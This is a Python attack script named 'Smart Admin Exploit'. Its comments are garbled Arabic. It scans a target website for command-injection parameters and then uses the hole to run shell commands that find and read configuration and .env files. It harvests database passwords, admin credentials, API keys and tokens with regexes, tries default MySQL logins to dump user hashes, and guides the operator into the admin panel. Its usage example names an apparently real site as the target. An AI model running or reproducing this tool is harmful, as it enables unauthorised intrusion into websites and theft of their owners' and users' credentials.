#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse
import sys
import re
import time
from colorama import Fore, Style, init

init(autoreset=True)

class SmartAdminExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.found_credentials = []
        self.injection_point = None
        
    def print_banner(self):
        banner = f"""
{Fore.RED + Style.BRIGHT}
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘           SMART ADMIN EXPLOIT v2.0           â•‘
â•‘           {Fore.CYAN}PRECISE EXPLOITATION{Fore.RED}                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
{Style.RESET_ALL}
Target: {Fore.GREEN}{self.target}{Style.RESET_ALL}
{Fore.WHITE}{'='*60}{Style.RESET_ALL}
        """
        print(banner)
    
    def find_injection_point(self):
        """Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ Ù„Ù„Ø«ØºØ±Ø©"""
        print(f"{Fore.CYAN}[+] Searching for REAL injection point...{Style.RESET_ALL}")
        
        # Ù‚Ø§Ø¦Ù…Ø© parameters Ù…Ø­ØªÙ…Ù„Ø©
        parameters = ['cmd', 'command', 'exec', 'shell', 'run', 'system', 'code']
        
        # Ù‚Ø§Ø¦Ù…Ø© ØµÙØ­Ø§Øª Ù…Ø­ØªÙ…Ù„Ø©
        pages = ['', '/admin', '/api', '/console', '/shell', '/command', '/debug']
        
        for page in pages:
            for param in parameters:
                # Ø¬Ø±Ø¨ Ø£ÙˆØ§Ù…Ø± Ø§Ø®ØªØ¨Ø§Ø±ÙŠØ©
                test_url = f"{self.target}{page}?{param}=whoami"
                
                try:
                    response = requests.get(test_url, timeout=8, verify=False)
                    
                    # ØªØ­Ù‚Ù‚ Ø¯Ù‚ÙŠÙ‚ Ù…Ù† Ø§Ù„Ù†Ø§ØªØ¬
                    if 'www-data' in response.text or 'root' in response.text:
                        print(f"{Fore.GREEN}[+] Injection found: {test_url}{Style.RESET_ALL}")
                        self.injection_point = (page, param)
                        return True
                    
                    # Ø¥Ø°Ø§ Ø§Ù„ØµÙØ­Ø© Ù…Ø®ØªÙ„ÙØ© Ø¹Ù† Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
                    elif page and response.status_code == 200:
                        if len(response.text) != len(requests.get(self.target).text):
                            print(f"{Fore.YELLOW}[?] Different page: {test_url}{Style.RESET_ALL}")
                            
                except Exception as e:
                    continue
        
        print(f"{Fore.RED}[-] No injection point found with standard parameters{Style.RESET_ALL}")
        return False
    
    def execute_command_smart(self, command):
        """ØªÙ†ÙÙŠØ° Ø£ÙˆØ§Ù…Ø± Ø¨Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„ØµØ­ÙŠØ­"""
        if not self.injection_point:
            return "Error: No injection point found"
            
        page, param = self.injection_point
        url = f"{self.target}{page}?{param}={urllib.parse.quote(command)}"
        
        try:
            response = requests.get(url, timeout=15, verify=False)
            return response.text.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def smart_config_extraction(self):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø°ÙƒÙŠ Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª"""
        print(f"\n{Fore.CYAN}[+] Smart configuration extraction...{Style.RESET_ALL}")
        
        # Ø£ÙˆÙ„Ø§Ù‹: Ø§ÙƒØªØ´Ø§Ù Ù‡ÙŠÙƒÙ„ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        web_structure = self.execute_command_smart("ls -la /var/www/html/ 2>/dev/null")
        if web_structure and "Error:" not in web_structure:
            print(f"{Fore.GREEN}[+] Web structure:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{web_structure}{Style.RESET_ALL}")
        
        # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù…Ù„ÙØ§Øª Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨Ø·Ø±Ù‚ Ù…ØªØ¹Ø¯Ø¯Ø©
        search_methods = [
            "find /var/www -name '*.php' | grep -i config | head -10",
            "find /var/www -name '*.env' 2>/dev/null",
            "find /var/www -name 'database.php' 2>/dev/null",
            "find /var/www -name 'settings.php' 2>/dev/null",
            "locate config.php 2>/dev/null | grep /var/www",
            "ls -la /var/www/html/*.php 2>/dev/null | grep -E '(config|database|setting)'"
        ]
        
        config_files = []
        for method in search_methods:
            result = self.execute_command_smart(method)
            if result and "Error:" not in result:
                files = result.split('\n')
                config_files.extend([f.strip() for f in files if f.strip()])
        
        # Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©
        for config_file in set(config_files):
            if config_file and not config_file.startswith('find:'):
                print(f"{Fore.GREEN}[+] Reading: {config_file}{Style.RESET_ALL}")
                content = self.execute_command_smart(f"cat {config_file} 2>/dev/null")
                
                if content and "Error:" not in content and len(content) > 10:
                    self.analyze_config_content(content, config_file)
    
    def analyze_config_content(self, content, file_path):
        """ØªØ­Ù„ÙŠÙ„ Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ù„ÙØ§Øª Ù„Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø©"""
        
        # Ø£Ù†Ù…Ø§Ø· Ù…ØªÙ‚Ø¯Ù…Ø© Ù„Ù„Ø¨Ø­Ø«
        patterns = {
            'DATABASE': [
                r"DB_USERNAME.*?=.*?['\"]([^'\"]+)",
                r"DB_PASSWORD.*?=.*?['\"]([^'\"]+)", 
                r"DB_DATABASE.*?=.*?['\"]([^'\"]+)",
                r"DB_HOST.*?=.*?['\"]([^'\"]+)",
                r"['\"]username['\"].*?=>.*?['\"]([^'\"]+)",
                r"['\"]password['\"].*?=>.*?['\"]([^'\"]+)"
            ],
            'ADMIN': [
                r"admin.*?password.*?=.*?['\"]([^'\"]+)",
                r"ADMIN_PASS.*?=.*?['\"]([^'\"]+)",
                r"superuser.*?=.*?['\"]([^'\"]+)",
                r"root.*?=.*?['\"]([^'\"]+)"
            ],
            'API_KEYS': [
                r"API_KEY.*?=.*?['\"]([^'\"]+)",
                r"SECRET.*?=.*?['\"]([^'\"]+)",
                r"TOKEN.*?=.*?['\"]([^'\"]+)"
            ]
        }
        
        for category, pattern_list in patterns.items():
            for pattern in pattern_list:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match and len(match) > 0:
                        print(f"{Fore.GREEN}    ğŸ”“ {category}: {match}{Style.RESET_ALL}")
                        self.found_credentials.append({
                            'type': category,
                            'value': match,
                            'source': file_path
                        })
    
    def extract_database_directly(self):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø¨Ø§Ø´Ø± Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª"""
        print(f"\n{Fore.CYAN}[+] Direct database extraction...{Style.RESET_ALL}")
        
        # Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ù„Ø¯Ø§ØªØ§Ø¨ÙŠØ²
        db_commands = [
            "mysql -uroot -proot -e 'SHOW DATABASES;' 2>/dev/null",
            "mysql -uadmin -padmin -e 'SELECT user,password FROM mysql.user;' 2>/dev/null",
            "ps aux | grep mysql",
            "find / -name '*.sql' -exec ls -la {} \\; 2>/dev/null | head -10"
        ]
        
        for cmd in db_commands:
            result = self.execute_command_smart(cmd)
            if result and "Error:" not in result and len(result) > 10:
                print(f"{Fore.GREEN}[DATABASE] {cmd}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{result[:500]}{Style.RESET_ALL}")
    
    def find_admin_panel_credentials(self):
        """Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¨ÙŠØ§Ù†Ø§Øª Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…"""
        print(f"\n{Fore.CYAN}[+] Finding admin panel credentials...{Style.RESET_ALL}")
        
        # Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†
        user_searches = [
            "grep -r 'admin' /var/www/html/ 2>/dev/null | grep -i password",
            "find /var/www -name '*.php' -exec grep -l 'admin.*password' {} \\; 2>/dev/null",
            "grep -r 'password' /var/www/html/ 2>/dev/null | grep -i admin"
        ]
        
        for search in user_searches:
            result = self.execute_command_smart(search)
            if result and "Error:" not in result:
                print(f"{Fore.GREEN}[ADMIN CREDS] {result}{Style.RESET_ALL}")
    
    def generate_smart_report(self):
        """ØªÙˆÙ„ÙŠØ¯ ØªÙ‚Ø±ÙŠØ± Ø°ÙƒÙŠ"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"                 SMART EXPLOITATION REPORT")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        if self.injection_point:
            page, param = self.injection_point
            print(f"{Fore.GREEN}[+] Injection Point:{Style.RESET_ALL}")
            print(f"   Page: {page if page else '/'}")
            print(f"   Parameter: {param}")
            print(f"   Example: {self.target}{page}?{param}=whoami")
        
        if self.found_credentials:
            print(f"\n{Fore.GREEN + Style.BRIGHT}[+] CREDENTIALS EXTRACTED:{Style.RESET_ALL}")
            for cred in self.found_credentials:
                print(f"{Fore.YELLOW}ğŸ”‘ {cred['type']}: {cred['value']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}   Source: {cred['source']}{Style.RESET_ALL}")
                
            print(f"\n{Fore.CYAN}[+] ADMIN PANEL ACCESS:{Style.RESET_ALL}")
            print(f"{Fore.WHITE}1. Go to: {self.target}/admin")
            print(f"2. Use extracted credentials")
            print(f"3. Access database management{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] No credentials found automatically{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Manual investigation required{Style.RESET_ALL}")
    
    def run_smart_exploitation(self):
        """ØªØ´ØºÙŠÙ„ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø°ÙƒÙŠ"""
        self.print_banner()
        
        # Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø§ÙƒØªØ´Ø§Ù Ø§Ù„Ø«ØºØ±Ø© Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ©
        if not self.find_injection_point():
            print(f"{Fore.RED}[-] Cannot proceed - no injection point found{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Starting smart exploitation...{Style.RESET_ALL}")
        
        # Ø§Ù„Ø®Ø·ÙˆØ© 2: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        self.smart_config_extraction()
        self.extract_database_directly()
        self.find_admin_panel_credentials()
        
        # Ø§Ù„Ø®Ø·ÙˆØ© 3: Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ
        self.generate_smart_report()

def main():
    if len(sys.argv) != 2:
        print(f"{Fore.RED}Usage: python3 smart_exploit.py TARGET_URL{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Example: python3 smart_exploit.py https://haram-transfer.com{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = SmartAdminExploit(target)
    exploit.run_smart_exploitation()

if __name__ == "__main__":
    main()